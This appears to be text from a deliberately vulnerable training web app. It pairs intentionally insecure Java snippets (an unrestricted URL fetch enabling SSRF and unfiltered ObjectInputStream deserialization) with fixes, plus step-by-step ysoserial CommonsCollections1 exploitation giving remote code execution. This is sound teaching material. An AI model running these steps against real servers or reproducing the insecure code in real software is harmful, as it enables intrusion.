Vulnerable Code

                        

                        

                            
// No SSRF protection!
URL url = new URL(userSuppliedUrl);
HttpURLConnection conn =
  (HttpURLConnection) url.openConnection();
// Fetches ANY URL including internal ones

                            

                            
Fix: Use an allowlist of permitted domains/IPs. Block 169.254.x.x, 10.x.x.x, 172.16.x.x, 192.168.x.x, and localhost.

                VULNERABILITY #6: Insecure Deserialization —
                The /api/restore-session endpoint deserializes Base64-encoded Java objects
                with no filtering. With commons-collections:3.2.1 on the classpath,
                ysoserial gadget chains achieve Remote Code Execution.
            


            

                

                    

                        

                            
Session Restore

                            
Restore a saved session from a serialized token

                        

                        

                            

                                
                                
                                

                                    
                                    Generate payload: java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" | base64
                                

                            


                            

                                
                                
                            


                            

                                

                                    Server Response
                                

                                

                            

                        

                    

                


                

                    

                        

                            
Exploitation Steps

                        

                        

                            
    
                                
  1. Download ysoserial.jar
    2. 
                                
  2. Generate a payload:
                                    
    java -jar ysoserial.jar \
  CommonsCollections1 \
  "touch /tmp/pwned" \
  | base64 -w0
    
                                
    3. 
                                
  3. Paste the Base64 output into the Session Token field
    4. 
                                
  4. Click "Restore Session" — the server deserializes it and executes your command
    5. 
                                
  5. Verify: ls /tmp/pwned
    6. 
                            

                        

                    


                    

                        

                            
Vulnerable Code

                        

                        

                            
byte[] data =
  Base64.getDecoder().decode(base64);
ObjectInputStream ois =
  new ObjectInputStream(
    new ByteArrayInputStream(data));
// No filtering! RCE via ysoserial:
Object obj = ois.readObject();

                            

                            
Fix: Use ObjectInputFilter to allowlist safe classes. Better: avoid Java serialization entirely; use JSON.
